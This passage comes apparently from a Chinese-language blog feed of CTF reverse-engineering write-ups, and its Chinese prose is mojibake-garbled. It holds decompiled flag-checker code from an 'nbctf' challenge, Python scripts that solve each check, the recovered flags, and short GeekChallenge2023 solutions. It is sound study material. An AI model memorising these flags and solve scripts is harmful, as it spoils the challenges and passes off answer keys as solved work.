class="number">1024LL</span>;</span><br><span class="line">  v16[<span class="number">5</span>] = <span class="number">2048LL</span>;</span><br><span class="line">  v16[<span class="number">6</span>] = <span class="number">0x2000</span>LL;</span><br><span class="line">  v16[<span class="number">7</span>] = <span class="number">0x4000</span>LL;</span><br><span class="line">  v15[<span class="number">0</span>] = <span class="number">177LL</span>;</span><br><span class="line">  v15[<span class="number">1</span>] = <span class="number">166LL</span>;</span><br><span class="line">  v15[<span class="number">2</span>] = <span class="number">183LL</span>;</span><br><span class="line">  v15[<span class="number">3</span>] = <span class="number">182LL</span>;</span><br><span class="line">  v15[<span class="number">4</span>] = <span class="number">177LL</span>;</span><br><span class="line">  v15[<span class="number">5</span>] = <span class="number">173LL</span>;</span><br><span class="line">  v17 = <span class="number">170</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( var )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *input_6 == <span class="number">110</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">1</span>] == <span class="number">98</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">2</span>] == <span class="number">99</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">3</span>] == <span class="number">116</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">4</span>] == <span class="number">102</span></span><br><span class="line">        &amp;&amp; input_6[<span class="number">5</span>] == <span class="number">123</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = encrypto2(input_6 + <span class="number">6</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">      v11 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = v11[i];</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 |= (v2 &amp; <span class="number">3</span>) &lt;&lt; (<span class="number">4</span> * j + <span class="number">2</span>);</span><br><span class="line">          v2 &gt;&gt;= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != v14[i] )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto2(input_6);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">      v12 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0LL</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">        data[k] = v12[k];</span><br><span class="line">      result = encrypto2(input_6);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6LL</span>:</span><br><span class="line">      v3 = *check1_var_add(input_6);</span><br><span class="line">      v8 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v3 &amp; -v3;</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="number">8</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v16[v8] == v5 )</span><br><span class="line">          ++v8;</span><br><span class="line">        v3 ^= v5;</span><br><span class="line">      &#125;</span><br><span class="line">      result = v8 == <span class="number">8</span> &amp;&amp; encrypto2(input_6);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8LL</span>:</span><br><span class="line">      v13 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0LL</span>; m &lt;= <span class="number">5</span>; ++m )</span><br><span class="line">        LOBYTE(v17) = v13[m] ^ v15[m];</span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================================================</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">encrypto2</span><span class="params">(_BYTE *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 k; <span class="comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10[<span class="number">6</span>]; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  __int64 v12[<span class="number">6</span>]; <span class="comment">// [rsp+90h] [rbp-70h]</span></span><br><span class="line">  __int64 v13[<span class="number">8</span>]; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">7</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0xD4F3</span>LL;</span><br><span class="line">  v13[<span class="number">1</span>] = <span class="number">0x3D49</span>LL;</span><br><span class="line">  v13[<span class="number">2</span>] = <span class="number">0x107B</span>LL;</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">0xC479</span>LL;</span><br><span class="line">  v13[<span class="number">4</span>] = <span class="number">0xAA84</span>LL;</span><br><span class="line">  v13[<span class="number">5</span>] = <span class="number">0x9807</span>LL;</span><br><span class="line">  v10[<span class="number">0</span>] = <span class="number">0x394C</span>LL;</span><br><span class="line">  v10[<span class="number">1</span>] = <span class="number">24063LL</span>;</span><br><span class="line">  v10[<span class="number">2</span>] = <span class="number">37349LL</span>;</span><br><span class="line">  v10[<span class="number">3</span>] = <span class="number">50716LL</span>;</span><br><span class="line">  v10[<span class="number">4</span>] = <span class="number">61563LL</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = <span class="number">1843061LL</span>;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">222420LL</span>;</span><br><span class="line">  v11[<span class="number">2</span>] = <span class="number">5184810LL</span>;</span><br><span class="line">  v11[<span class="number">3</span>] = <span class="number">4590105LL</span>;</span><br><span class="line">  v11[<span class="number">4</span>] = <span class="number">2184197LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v12[<span class="number">0</span>] = <span class="number">1073741834LL</span>;</span><br><span class="line">  v12[<span class="number">1</span>] = <span class="number">2415919110LL</span>;</span><br><span class="line">  v12[<span class="number">2</span>] = <span class="number">939524099LL</span>;</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">536870913LL</span>;</span><br><span class="line">  v12[<span class="number">4</span>] = <span class="number">1845493760LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( var )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      v6 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">if</span> ( (*v6 ^ <span class="number">0x5F</span>) == v6[<span class="number">1</span>]</span><br><span class="line">        &amp;&amp; (v6[<span class="number">1</span>] ^ <span class="number">0x75</span>) == v6[<span class="number">2</span>]</span><br><span class="line">        &amp;&amp; (v6[<span class="number">2</span>] ^ <span class="number">0x12</span>) == v6[<span class="number">3</span>]</span><br><span class="line">        &amp;&amp; (v6[<span class="number">3</span>] ^ <span class="number">0x38</span>) == *v6</span><br><span class="line">        &amp;&amp; *v6 == <span class="number">0x6C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = encrypto(input);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      v7 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v13[i] + v13[i + <span class="number">1</span>] * v7[i] != v11[i] )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">      v8 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 += data[j] + (v8[j] &lt;&lt; <span class="number">7</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != v10[j] )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto2(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">      v9 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0LL</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v12[k] != ((v9[k] &gt;&gt; (k + <span class="number">3</span>)) | (v9[k] &lt;&lt; (<span class="number">32</span> - (k + <span class="number">3</span>)))) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7LL</span>:</span><br><span class="line">      qword_404308 = *check1_var_add(input);</span><br><span class="line">      result = *&amp;qword_404308 == <span class="number">3.325947034342098e151</span> &amp;&amp; encrypto(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================================================</span></span><br><span class="line"></span><br><span class="line">_BYTE *__fastcall <span class="title function_">check1_var_add</span><span class="params">(_BYTE *input_6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = var++;</span><br><span class="line">  v5 = word_404090[v1];                         <span class="comment">// ä¸‹åˆ’çº¿æ•°é‡</span></span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *++input_6 == <span class="string">&#x27;&#125;&#x27;</span> || !*input_6 )       <span class="comment">// *(input + 1) == &#x27;&#125;&#x27; || !*input</span></span><br><span class="line">                                                <span class="comment">// input++</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Aww shucks!&quot;</span>);</span><br><span class="line">      println(v2, &amp;MEMORY[<span class="number">0x7F456B738680</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *input_6 == <span class="string">&#x27;_&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++input_6;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªåŠ å¯†å‡½æ•°éƒ½è°ƒç”¨äº†çš„<code>check1_var_add(_BYTE *input_6)</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªé€šè¿‡å½“å‰â€æ­¥æ•°â€(<code>var</code> å¯¹åº”æ¯ä¸ªcaseå—çš„åŠ å¯†)æ¥è¿”å›å½“å‰åŠ å¯†çš„å•è¯åœ¨æ•´ä¸ªflagä¸­çš„ä½ç½®(flagä¸­æ¯ä¸ªå•è¯ç”¨<code>_</code>åˆ†å‰²) åŠ¨æ€è°ƒè¯•æ—¶å‘ç°æ­¥æ•°å’Œä½ç½®çš„å¯¹åº”å…³ç³»å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">index:    <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span></span><br><span class="line">var:    <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>å…¶å®å¾—åˆ°äº†è¿™äº›ä¿¡æ¯åä¸€æ­¥æ­¥æ”»ç ´æ¯ä¸ªcaseå—çš„åŠ å¯†å³å¯ ä½†çœ‹å‡º<code>check1_var_add(_BYTE *input_6)</code>çš„ä½œç”¨å®é™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ª ä»¥ä¸‹ç»™å‡ºæ¯ä¸ªåŠ å¯†å—å¯¹åº”çš„è§£å¯†è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># case 1:</span></span><br><span class="line">flag = []</span><br><span class="line">flag.append(<span class="number">0x6C</span>)</span><br><span class="line">flag.append(flag[<span class="number">0</span>] ^ <span class="number">0x5F</span>)</span><br><span class="line">flag.append(flag[<span class="number">1</span>] ^ <span class="number">0x75</span>)</span><br><span class="line">flag.append(flag[<span class="number">2</span>] ^ <span class="number">0x12</span>)</span><br><span class="line">flag.append(flag[<span class="number">3</span>] ^ <span class="number">0x38</span>)</span><br><span class="line">flag[<span class="number">0</span>] = [<span class="built_in">chr</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> flag]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># l3FTl __5</span></span><br><span class="line"><span class="comment"># l3FT  __5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 2:</span></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="number">4</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="number">0x4808</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="number">0xc40</span></span><br><span class="line">flag[<span class="number">2</span>] = <span class="number">0x480c</span></span><br><span class="line">flag[<span class="number">3</span>] = <span class="number">0x408c</span></span><br><span class="line">flag = [val &gt;&gt; <span class="number">2</span> <span class="keyword">for</span> val <span class="keyword">in</span> flag]</span><br><span class="line">flag = [<span class="built_in">chr</span>(val &amp; <span class="number">3</span> | ((val &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">2</span> | ((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span> | ((val &gt;&gt; <span class="number">12</span>) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) <span class="keyword">for</span> val <span class="keyword">in</span> flag]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># b4cK __8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 3:</span></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="number">5</span></span><br><span class="line">flag[<span class="number">0</span>] =  <span class="number">0x1c1f75</span></span><br><span class="line">flag[<span class="number">1</span>] =  <span class="number">0x364d4</span></span><br><span class="line">flag[<span class="number">2</span>] =  <span class="number">0x4f1d2a</span></span><br><span class="line">flag[<span class="number">3</span>] =  <span class="number">0x460a19</span></span><br><span class="line">flag[<span class="number">4</span>] =  <span class="number">0x215405</span></span><br><span class="line">key = [<span class="literal">None</span>] * <span class="number">6</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">0xD4F3</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">0x3D49</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">0x107B</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">0xC479</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">0xAA84</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">0x9807</span></span><br><span class="line">flag = [<span class="built_in">chr</span>(<span class="built_in">int</span>((flag[i] - key[i]) / key[i + <span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># r1gh7 __3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 4 &amp; 5:</span></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">5</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0x394C</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">24063</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">37349</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">50716</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">61563</span></span><br><span class="line">copy = [val <span class="keyword">for</span> val <span class="keyword">in</span> enc]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        enc[i] -= copy[i - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] &gt;&gt; <span class="number">7</span>), <span class="built_in">chr</span>(enc[i] % <span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># r L</span></span><br><span class="line"><span class="comment"># I 3</span></span><br><span class="line"><span class="comment"># g f</span></span><br><span class="line"><span class="comment"># h 7</span></span><br><span class="line"><span class="comment"># T _</span></span><br><span class="line"><span class="comment"># index:</span></span><br><span class="line"><span class="comment"># 4 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 5:</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">100</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0x4000000a</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0x90000006</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0x38000003</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0x20000001</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0x6e000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] &gt;&gt; (<span class="number">32</span> - (i + <span class="number">3</span>)) | enc[i] &lt;&lt; (i + <span class="number">3</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># RigH7 __7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 6:</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0x10</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0x20</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0x200</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0x400</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">0x800</span></span><br><span class="line">enc[<span class="number">6</span>] = <span class="number">0x2000</span></span><br><span class="line">enc[<span class="number">7</span>] = <span class="number">0x4000</span></span><br><span class="line"><span class="comment"># print(chr(0x31), chr(0x6E))</span></span><br><span class="line"><span class="comment"># 1n __6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 7:</span></span><br><span class="line">x = <span class="number">0x5F64523477723066</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((x &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0XFF</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># f0rw4Rd_ __2</span></span><br></pre></td></tr></table></figure>

<p>æœ€åé—®é¢˜æ¥äº† å®é™…ä¸Šcall raxå¯¹åº”åˆ°ä¼ªä»£ç å°±æ˜¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">8LL</span>:</span><br><span class="line">      v13 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0LL</span>; m &lt;= <span class="number">5</span>; ++m )</span><br><span class="line">        LOBYTE(v17) = v13[m] ^ v15[m];</span><br><span class="line">        (&amp;v17)();		<span class="comment">//è°ƒç”¨v17</span></span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå…¶å®raxæ˜¯æ ¹æ®è®¡ç®—å¾—åˆ°çš„ä¸ç¡®å®šçš„å€¼ ä½†æ˜¯åŸæ¥çš„ç¨‹åºå°‘äº†è¿™ä¸€æ­¥è²Œä¼¼ä¹Ÿæ˜¯ç”šè‡³å°±åº”è¯¥è¿™æ ·ç…§å¸¸è¿è¡Œ é‚£ä¹ˆä»€ä¹ˆæ—¶å€™call raxç›¸å½“äºä»€ä¹ˆéƒ½æ²¡åšå‘¢?</p>
<ol>
<li>call $+5	;èŠ±æŒ‡ä»¤</li>
<li>call rax     ;rax -&gt; ret è°ƒç”¨åç«‹å³è¿”å›</li>
</ol>
<p>ç¬¬ä¸€ç§æ˜¾ç„¶ä¸å¤ªå¯èƒ½ é‚£å°±æ˜¯å½“<code>rax == retn(C3)</code>æ—¶äº†! äºæ˜¯å†™å‡ºæœ€åä¸€å—è§£å¯†è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># case 8:</span></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">6</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0xb1</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0xa6</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0xb7</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0xb6</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0xb1</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">0xad</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(each ^ <span class="number">0xC3</span> &amp; <span class="number">0xFF</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># return __9</span></span><br></pre></td></tr></table></figure>

<p>æœ€åç»„åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆflag:<code>nbctf&#123;L3f7_f0rw4Rd_r1gh7_rIghT_l3FT_1n_RigH7_b4cK_return&#125;</code></p>
<p>(å…¶å®<code>nbctf&#123;L3f7_f0rw4Rd_r1gh7_rIghT_l3FTl_1n_RigH7_b4cK_return</code>ä¹Ÿèƒ½è®©ç¨‹åºè¿”å›æ­£ç¡®çš„æç¤º ä½†æ˜¾ç„¶æ˜¯éé¢„æœŸè§£)</p>
<h2 id="wee-woo-æ ˆæœºé€†å‘"><a href="#wee-woo-æ ˆæœºé€†å‘" class="headerlink" title="wee-woo | æ ˆæœºé€†å‘"></a>wee-woo | æ ˆæœºé€†å‘</h2><p><a href="https://1k0ct.github.io/2024/03/05/%E5%8F%A4%E7%A5%9E%E8%AF%AD%E4%B9%8B%E7%A0%94%E7%A9%B6/#%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B">UIUAç ”ç©¶</a></p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>GeekChallenge2023é€†å‘æ–¹å‘wp</title>
    <url>/2024/02/22/GeekChallenge2023%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT</p>
<span id="more"></span>

<h3 id="Shift-jmp-ç®€å•èŠ±æŒ‡ä»¤"><a href="#Shift-jmp-ç®€å•èŠ±æŒ‡ä»¤" class="headerlink" title="Shift_jmp | ç®€å•èŠ±æŒ‡ä»¤"></a>Shift_jmp | ç®€å•èŠ±æŒ‡ä»¤</h3><p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011221.png" alt="image-20240223003954050"></p>
<p>å°†æ— æ¡ä»¶è·³è½¬å’Œ<code>loc_117A</code>patchä¸º<code>nop</code>é‡æ„ä¸»å‡½æ•°</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-011426.png" alt="image-20231107160634631" style="zoom: 50%;" />

<p>ç®€å•çš„å¼‚æˆ–åŠ å¯† è§£é¢˜Pythonè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">83</span>,  <span class="number">88</span>,  <span class="number">65</span>, <span class="number">120</span>,  <span class="number">83</span>,  <span class="number">54</span>, <span class="number">106</span>, <span class="number">100</span>,  <span class="number">56</span>, <span class="number">100</span>, </span><br><span class="line">  <span class="number">111</span>,  <span class="number">84</span>, <span class="number">120</span>,  <span class="number">66</span>,  <span class="number">81</span>, <span class="number">123</span>, <span class="number">120</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">97</span>, </span><br><span class="line">   <span class="number">39</span>,  <span class="number">99</span>, <span class="number">115</span>,  <span class="number">69</span>,  <span class="number">45</span>, <span class="number">124</span>,  <span class="number">69</span>, <span class="number">108</span>,  <span class="number">44</span>, <span class="number">111</span>, </span><br><span class="line">   <span class="number">47</span>, <span class="number">123</span>,  <span class="number">94</span>,  <span class="number">92</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(key[i] ^ i ^ <span class="number">0</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜-Cæºç çš„ç¼–è¯‘"><a href="#ç‚¹å‡»å°±é€çš„é€†å‘é¢˜-Cæºç çš„ç¼–è¯‘" class="headerlink" title="ç‚¹å‡»å°±é€çš„é€†å‘é¢˜ | Cæºç çš„ç¼–è¯‘"></a>ç‚¹å‡»å°±é€çš„é€†å‘é¢˜ | Cæºç çš„ç¼–è¯‘</h3><p><code>.s</code>æ–‡ä»¶æ˜¯ç”±Cæºç ç¼–è¯‘è€Œæ¥çš„æ±‡ç¼–æŒ‡ä»¤ å®ƒä¸<code>.S</code>æ–‡ä»¶çš„åŒºåˆ«æ˜¯å®ƒä¸æ”¯æŒé¢„å¤„ç†(#defineâ€¦) gccç¼–è¯‘å™¨å¯ä»¥å°†å…¶ç»è¿‡é“¾æ¥ç­‰å†ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ æ•…å¯ä»¥å…ˆå°†<code>.s</code>æ–‡ä»¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶å†ç”¨IDAåˆ†æ</p>
<p><code>clang click.s -o click</code></p>
<p>Kaliè™šæ‹Ÿæœºé¢„è£…çš„gccç¼–è¯‘å™¨ç”¨ä»¥ä¸ŠæŒ‡ä»¤å¯ä»¥ç›´æ¥å°†<code>.s</code>æ–‡ä»¶ç¼–è¯‘ä¸ºLinuxå¯æ‰§è¡Œæ–‡ä»¶</p>
